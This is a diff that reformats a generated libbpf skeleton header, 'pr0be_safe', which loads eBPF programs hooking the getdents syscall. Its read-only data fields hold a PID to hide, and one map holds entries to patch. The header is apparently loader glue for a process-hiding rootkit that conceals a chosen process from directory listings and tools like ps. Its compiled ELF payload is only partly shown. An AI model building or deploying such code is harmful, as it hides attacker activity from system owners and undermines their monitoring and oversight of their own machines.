@@ -4,193 +4,168 @@
 #ifndef __PR0BE_SAFE_SKEL_H__
 #define __PR0BE_SAFE_SKEL_H__
 
+#include <bpf/libbpf.h>
 #include <errno.h>
 #include <stdlib.h>
-#include <bpf/libbpf.h>
 
 struct pr0be_safe {
-	struct bpf_object_skeleton *skeleton;
-	struct bpf_object *obj;
-	struct {
-		struct bpf_map *map_buffs;
-		struct bpf_map *map_bytes_read;
-		struct bpf_map *map_prog_array;
-		struct bpf_map *map_to_patch;
-		struct bpf_map *rb;
-		struct bpf_map *rodata;
-	} maps;
-	struct {
-		struct bpf_program *handle_getdents_enter;
-		struct bpf_program *handle_getdents_exit;
-		struct bpf_program *handle_getdents_patch;
-	} progs;
-	struct {
-		struct bpf_link *handle_getdents_enter;
-		struct bpf_link *handle_getdents_exit;
-		struct bpf_link *handle_getdents_patch;
-	} links;
-	struct pr0be_safe__rodata {
-		int target_ppid;
-		int pid_to_hide_len;
-		char pid_to_hide[10];
-	} *rodata;
+  struct bpf_object_skeleton *skeleton;
+  struct bpf_object *obj;
+  struct {
+    struct bpf_map *map_buffs;
+    struct bpf_map *map_bytes_read;
+    struct bpf_map *map_prog_array;
+    struct bpf_map *map_to_patch;
+    struct bpf_map *rb;
+    struct bpf_map *rodata;
+  } maps;
+  struct {
+    struct bpf_program *handle_getdents_enter;
+    struct bpf_program *handle_getdents_exit;
+    struct bpf_program *handle_getdents_patch;
+  } progs;
+  struct {
+    struct bpf_link *handle_getdents_enter;
+    struct bpf_link *handle_getdents_exit;
+    struct bpf_link *handle_getdents_patch;
+  } links;
+  struct pr0be_safe__rodata {
+    int target_ppid;
+    int pid_to_hide_len;
+    char pid_to_hide[10];
+  } * rodata;
 };
 
-static void
-pr0be_safe__destroy(struct pr0be_safe *obj)
-{
-	if (!obj)
-		return;
-	if (obj->skeleton)
-		bpf_object__destroy_skeleton(obj->skeleton);
-	free(obj);
+static void pr0be_safe__destroy(struct pr0be_safe *obj) {
+  if (!obj) return;
+  if (obj->skeleton) bpf_object__destroy_skeleton(obj->skeleton);
+  free(obj);
 }
 
-static inline int
-pr0be_safe__create_skeleton(struct pr0be_safe *obj);
+static inline int pr0be_safe__create_skeleton(struct pr0be_safe *obj);
 
-static inline struct pr0be_safe *
-pr0be_safe__open_opts(const struct bpf_object_open_opts *opts)
-{
-	struct pr0be_safe *obj;
-	int err;
+static inline struct pr0be_safe *pr0be_safe__open_opts(
+    const struct bpf_object_open_opts *opts) {
+  struct pr0be_safe *obj;
+  int err;
 
-	obj = (struct pr0be_safe *)calloc(1, sizeof(*obj));
-	if (!obj) {
-		errno = ENOMEM;
-		return NULL;
-	}
+  obj = (struct pr0be_safe *)calloc(1, sizeof(*obj));
+  if (!obj) {
+    errno = ENOMEM;
+    return NULL;
+  }
 
-	err = pr0be_safe__create_skeleton(obj);
-	if (err)
-		goto err_out;
+  err = pr0be_safe__create_skeleton(obj);
+  if (err) goto err_out;
 
-	err = bpf_object__open_skeleton(obj->skeleton, opts);
-	if (err)
-		goto err_out;
+  err = bpf_object__open_skeleton(obj->skeleton, opts);
+  if (err) goto err_out;
 
-	return obj;
+  return obj;
 err_out:
-	pr0be_safe__destroy(obj);
-	errno = -err;
-	return NULL;
+  pr0be_safe__destroy(obj);
+  errno = -err;
+  return NULL;
 }
 
-static inline struct pr0be_safe *
-pr0be_safe__open(void)
-{
-	return pr0be_safe__open_opts(NULL);
+static inline struct pr0be_safe *pr0be_safe__open(void) {
+  return pr0be_safe__open_opts(NULL);
 }
 
-static inline int
-pr0be_safe__load(struct pr0be_safe *obj)
-{
-	return bpf_object__load_skeleton(obj->skeleton);
+static inline int pr0be_safe__load(struct pr0be_safe *obj) {
+  return bpf_object__load_skeleton(obj->skeleton);
 }
 
-static inline struct pr0be_safe *
-pr0be_safe__open_and_load(void)
-{
-	struct pr0be_safe *obj;
-	int err;
+static inline struct pr0be_safe *pr0be_safe__open_and_load(void) {
+  struct pr0be_safe *obj;
+  int err;
 
-	obj = pr0be_safe__open();
-	if (!obj)
-		return NULL;
-	err = pr0be_safe__load(obj);
-	if (err) {
-		pr0be_safe__destroy(obj);
-		errno = -err;
-		return NULL;
-	}
-	return obj;
+  obj = pr0be_safe__open();
+  if (!obj) return NULL;
+  err = pr0be_safe__load(obj);
+  if (err) {
+    pr0be_safe__destroy(obj);
+    errno = -err;
+    return NULL;
+  }
+  return obj;
 }
 
-static inline int
-pr0be_safe__attach(struct pr0be_safe *obj)
-{
-	return bpf_object__attach_skeleton(obj->skeleton);
+static inline int pr0be_safe__attach(struct pr0be_safe *obj) {
+  return bpf_object__attach_skeleton(obj->skeleton);
 }
 
-static inline void
-pr0be_safe__detach(struct pr0be_safe *obj)
-{
-	return bpf_object__detach_skeleton(obj->skeleton);
+static inline void pr0be_safe__detach(struct pr0be_safe *obj) {
+  return bpf_object__detach_skeleton(obj->skeleton);
 }
 
 static inline const void *pr0be_safe__elf_bytes(size_t *sz);
 
-static inline int
-pr0be_safe__create_skeleton(struct pr0be_safe *obj)
-{
-	struct bpf_object_skeleton *s;
+static inline int pr0be_safe__create_skeleton(struct pr0be_safe *obj) {
+  struct bpf_object_skeleton *s;
 
-	s = (struct bpf_object_skeleton *)calloc(1, sizeof(*s));
-	if (!s)
-		goto err;
-	obj->skeleton = s;
+  s = (struct bpf_object_skeleton *)calloc(1, sizeof(*s));
+  if (!s) goto err;
+  obj->skeleton = s;
 
-	s->sz = sizeof(*s);
-	s->name = "pr0be_safe";
-	s->obj = &obj->obj;
+  s->sz = sizeof(*s);
+  s->name = "pr0be_safe";
+  s->obj = &obj->obj;
 
-	/* maps */
-	s->map_cnt = 6;
-	s->map_skel_sz = sizeof(*s->maps);
-	s->maps = (struct bpf_map_skeleton *)calloc(s->map_cnt, s->map_skel_sz);
-	if (!s->maps)
-		goto err;
+  /* maps */
+  s->map_cnt = 6;
+  s->map_skel_sz = sizeof(*s->maps);
+  s->maps = (struct bpf_map_skeleton *)calloc(s->map_cnt, s->map_skel_sz);
+  if (!s->maps) goto err;
 
-	s->maps[0].name = "map_buffs";
-	s->maps[0].map = &obj->maps.map_buffs;
+  s->maps[0].name = "map_buffs";
+  s->maps[0].map = &obj->maps.map_buffs;
 
-	s->maps[1].name = "map_bytes_read";
-	s->maps[1].map = &obj->maps.map_bytes_read;
+  s->maps[1].name = "map_bytes_read";
+  s->maps[1].map = &obj->maps.map_bytes_read;
 
-	s->maps[2].name = "map_prog_array";
-	s->maps[2].map = &obj->maps.map_prog_array;
+  s->maps[2].name = "map_prog_array";
+  s->maps[2].map = &obj->maps.map_prog_array;
 
-	s->maps[3].name = "map_to_patch";
-	s->maps[3].map = &obj->maps.map_to_patch;
+  s->maps[3].name = "map_to_patch";
+  s->maps[3].map = &obj->maps.map_to_patch;
 
-	s->maps[4].name = "rb";
-	s->maps[4].map = &obj->maps.rb;
+  s->maps[4].name = "rb";
+  s->maps[4].map = &obj->maps.rb;
 
-	s->maps[5].name = "pr0be_sa.rodata";
-	s->maps[5].map = &obj->maps.rodata;
-	s->maps[5].mmaped = (void **)&obj->rodata;
+  s->maps[5].name = "pr0be_sa.rodata";
+  s->maps[5].map = &obj->maps.rodata;
+  s->maps[5].mmaped = (void **)&obj->rodata;
 
-	/* programs */
-	s->prog_cnt = 3;
-	s->prog_skel_sz = sizeof(*s->progs);
-	s->progs = (struct bpf_prog_skeleton *)calloc(s->prog_cnt, s->prog_skel_sz);
-	if (!s->progs)
-		goto err;
+  /* programs */
+  s->prog_cnt = 3;
+  s->prog_skel_sz = sizeof(*s->progs);
+  s->progs = (struct bpf_prog_skeleton *)calloc(s->prog_cnt, s->prog_skel_sz);
+  if (!s->progs) goto err;
 
-	s->progs[0].name = "handle_getdents_enter";
-	s->progs[0].prog = &obj->progs.handle_getdents_enter;
-	s->progs[0].link = &obj->links.handle_getdents_enter;
+  s->progs[0].name = "handle_getdents_enter";
+  s->progs[0].prog = &obj->progs.handle_getdents_enter;
+  s->progs[0].link = &obj->links.handle_getdents_enter;
 
-	s->progs[1].name = "handle_getdents_exit";
-	s->progs[1].prog = &obj->progs.handle_getdents_exit;
-	s->progs[1].link = &obj->links.handle_getdents_exit;
+  s->progs[1].name = "handle_getdents_exit";
+  s->progs[1].prog = &obj->progs.handle_getdents_exit;
+  s->progs[1].link = &obj->links.handle_getdents_exit;
 
-	s->progs[2].name = "handle_getdents_patch";
-	s->progs[2].prog = &obj->progs.handle_getdents_patch;
-	s->progs[2].link = &obj->links.handle_getdents_patch;
+  s->progs[2].name = "handle_getdents_patch";
+  s->progs[2].prog = &obj->progs.handle_getdents_patch;
+  s->progs[2].link = &obj->links.handle_getdents_patch;
 
-	s->data = (void *)pr0be_safe__elf_bytes(&s->data_sz);
+  s->data = (void *)pr0be_safe__elf_bytes(&s->data_sz);
 
-	return 0;
+  return 0;
 err:
-	bpf_object__destroy_skeleton(s);
-	return -ENOMEM;
+  bpf_object__destroy_skeleton(s);
+  return -ENOMEM;
 }
 
-static inline const void *pr0be_safe__elf_bytes(size_t *sz)
-{
-	*sz = 775808;
-	return (const void *)"\
+static inline const void *pr0be_safe__elf_bytes(size_t *sz) {
+  *sz = 775808;
+  return (const void *)"\
 \x7f\x45\x4c\x46\x02\x01\x01\0\0\0\0\0\0\0\0\0\x01\0\xf7\0\x01\0\0\0\0\0\0\0\0\
 \0\0\0\0\0\0\0\0\0\0\0\xc0\xcf\x0b\0\0\0\0\0\0\0\0\0\x40\0\0\0\0\0\x40\0\x1b\0\
 \x01\0\xbf\x16\0\0\0\0\0\0\x85\0\0\0\x0e\0\0\0\x7b\x0a\xf8\xff\0\0\0\0\x18\x07\
@@ -32295,4 +32270,3 @@ static inline const void *pr0be_safe__elf_bytes(size_t *sz)
 }
 
 #endif /* __PR0BE_SAFE_SKEL_H__ */
-
